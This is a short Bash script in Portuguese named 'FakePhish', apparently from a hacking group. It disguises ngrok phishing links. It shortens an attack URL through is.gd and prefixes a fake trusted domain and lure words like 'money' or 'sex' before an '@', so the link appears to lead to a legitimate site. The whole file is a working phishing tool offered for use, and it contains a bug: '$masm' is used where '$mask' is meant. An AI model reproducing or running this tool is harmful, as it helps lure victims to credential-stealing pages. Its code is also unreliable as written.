#!/usr/bin/env bash

# esss script é criado para desfarce de link ngrok ...
# AUTOR: darky
# GRUPO: C4OS | BLACK BLOC
# DATA: 15/01/2021
# use esse script com sabedoria
# TOOL INSPIRED BY: MASKPHISH | KP

# MANTENHA SIMPLES IDIOTA
checkar_url() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
	echo "ERROR URL"
 	exit 1
  fi

fi

}

pkg install figlet -y
clear
figlet FakePhish

echo

read -p 'Cole aqui o link (https / http): ' link_recebido
checkar_url $link_recebido
sleep 1
echo
echo 'Processar e modificar a url de ataque'
echo

short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link_recebido})
shorter=${short#https://}

echo 'Mask de dominio ex: https / http ( https://google.com )'
read -p 'digite a mask: ' mask
checkar_url $mask

echo
	echo 'digite palavras de engenharia social (dinheiro , sexo , etc..)'
	echo 'não use espaços apenas ( - )'

echo -n '--> '
read palavras

	echo 'Gerando Link Aguarde...'
gerado=$masm-$palavras@$shorter
	echo
	echo "Seu link: ( adicione https ou http ) ${gerado}"
exit
